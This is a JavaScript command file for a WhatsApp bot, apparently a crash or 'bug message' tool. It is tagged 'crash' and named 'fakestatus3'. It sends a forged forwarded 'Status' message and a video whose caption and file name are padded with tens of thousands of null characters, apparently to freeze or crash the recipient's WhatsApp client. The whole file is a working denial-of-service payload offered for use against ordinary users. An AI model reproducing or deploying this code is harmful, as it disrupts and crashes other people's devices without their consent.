let handler = async (m, { conn }) => {
  try {
    // Texto visible del video
    const visibleText = 'Tobi';

    // Cantidad de caracteres nulos (\u0000)
    const nullRepeatEstado = 90000; // Solo \u0000 en el estado
    const nullRepeatVideo = 80000;  // Tobi + \u0000 * 6

    const nullChar = '\u0000';

    // Generar nombres
    const fakeNameEstado = nullChar.repeat(nullRepeatEstado);         // ␀␀␀ (sin texto visible)
    const fakeNameVideo = visibleText + nullChar.repeat(nullRepeatVideo); // Tobi␀␀␀␀␀␀

    // Video desde URL (Catbox)
    const videoUrl = 'https://files.catbox.moe/cs2psi.mp4'; // reemplaza con tu URL

    // 1️⃣ Enviar mensaje tipo estado (solo nulls)
    await conn.sendMessage(m.chat, {
      text: `WhatsApp • Status\n📄 ${fakeNameEstado}`,
      contextInfo: {
        isForwarded: true,
        forwardingScore: 999,
        externalAdReply: {
          title: fakeNameEstado,
          body: "",
          mediaType: 1,
          previewType: "NONE"
        }
      }
    }, { quoted: m });

    // 2️⃣ Enviar el video con texto Tobi + nulls
    await conn.sendMessage(m.chat, {
      video: { url: videoUrl },
      caption: fakeNameVideo,
      gifPlayback: false,
      fileName: fakeNameVideo
    }, { quoted: m });

  } catch (e) {
    console.error(e);
    m.reply("❌ Error al ejecutar el comando.");
  }
};

handler.command = ['fakestatus3'];
handler.tags = ['test', 'crash'];
handler.help = ['fakestatus3'];
handler.private = true;
handler.register = true;
handler.estrellas = 4;

export default handler;